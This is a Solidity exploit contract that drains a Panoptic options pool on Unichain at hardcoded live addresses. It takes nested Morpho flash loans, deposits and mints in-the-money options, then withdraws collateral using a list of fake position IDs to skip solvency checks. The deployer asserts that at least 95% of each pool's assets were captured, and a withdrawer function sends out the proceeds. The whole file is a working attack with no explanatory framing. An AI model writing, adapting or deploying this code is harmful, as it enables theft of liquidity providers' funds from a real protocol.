// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract WETH_USDC5bpsUnichainAttacker_Deployer {
    WETH_USDC5bpsUnichainAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x078D782b760474a361dDA0AF3839290b0EF57AD6)); // usdc
    IERC20Partial token1 = IERC20Partial(address(0x4200000000000000000000000000000000000006)); // weth
    ICollateralTracker tracker0 = ICollateralTracker(address(0xE5565daeE2ccDD18736AD8B1A279A43626bbf369));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x607435A33C4310A98A8Ff67C40d02FD3ED2020dB));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new WETH_USDC5bpsUnichainAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract WETH_USDC5bpsUnichainAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [17035745045722363, 16993655162578412, 17009206836208441, 16939609024273842, 16995993874926379, 17158553267796065, 17083582814389265, 17101708812844843, 16927858255610090, 17069357979992109, 17101378560687335, 17026674622507335, 17154261232855203, 17030439208130036, 16945967490755149, 16905884702516433, 17066504289794370, 17119504401467382, 16985606900097701, 16954544221541041, 16920216715452750, 17085189125086153, 16988002051593903, 17126645520732798, 17074540876198711, 17119951603807036, 17122846506677707, 17018492495701600, 17058114656058193, 16999873957325411, 16892817363524338, 17049620233322987, 16900417526689188, 17130624793684447, 17024105470881979, 16910690735799991, 16890488824791009, 17003020264083211, 16946961090832675, 16941005867879549, 17103589480369901, 17008221870292762, 16918871661380487, 16989238486935005, 17142166672779123, 16897464278369093, 17144420237880467, 16927713925256617, 16894635486029112, 16923138720850302, 17114373863952007, 16992821954860765, 17027825720482802, 16942409542027123, 17062001812029684, 16896222394180792, 17100042690718021, 16969369082248421, 16905463410247128, 17001603935953842, 17074313683106350, 17038292193577029, 17029512578671493, 16979809844856197, 17130759040409663, 17114800599387293, 16908625724213635, 17138198303696334, 17106273295414794, 16908147932247101, 16895911887472093, 16938993875545352, 17075863080850773, 17118102226994995, 16908153974732775, 17014445553286162, 16899543848560918, 17119602343874712, 16895531852075711, 17099849001593597, 17153702279128601, 17020691157262149, 16897926812058864, 17154365982004348, 16992035341009344, 17054951623905443, 17045419378318324, 16946829128487768, 17146520609095429, 16972156248137231, 17083148281277439, 17115324528783460, 17142593927072576, 17140315683590255, 17094514593261230, 17035185689438149, 16987242283774540, 16888769806416760, 17106588479166820, 17029198303267245, 17050369048063491, 17029065097821193, 16942458681986566, 17057227897167136, 16978155495900437, 17029873506273690, 16990649632113938, 17060232259853742, 16968539133849167, 16993502753544935, 17167047696388934, 17061718554541272, 16936365070053071, 16889202049759961, 17025796118226330, 17022685737634914, 17064829018677470, 17057008683916553, 16921290824134246, 16932248563778116, 17030010218713865, 16970073014124536, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On unichain
    IERC20Partial token0 = IERC20Partial(address(0x078D782b760474a361dDA0AF3839290b0EF57AD6)); // usdc
    IERC20Partial token1 = IERC20Partial(address(0x4200000000000000000000000000000000000006)); // weth
    IMorpho morpho = IMorpho(address(0x8f5ae9CddB9f68de460C77730b018Ae7E04a140A));

    ICollateralTracker tracker0 = ICollateralTracker(address(0xE5565daeE2ccDD18736AD8B1A279A43626bbf369));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x607435A33C4310A98A8Ff67C40d02FD3ED2020dB));
    IPanopticPool pp = IPanopticPool(address(0x000EC408A89688b5E5501C6a60EF18f13dB40F06));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            morpho.flashLoan(address(token0), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            token0.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(2535301200511801961049817910644);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(2535301200511801961049817910644);
        posIdList2[1] = TokenId.wrap(2560008631394908910547165810036);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
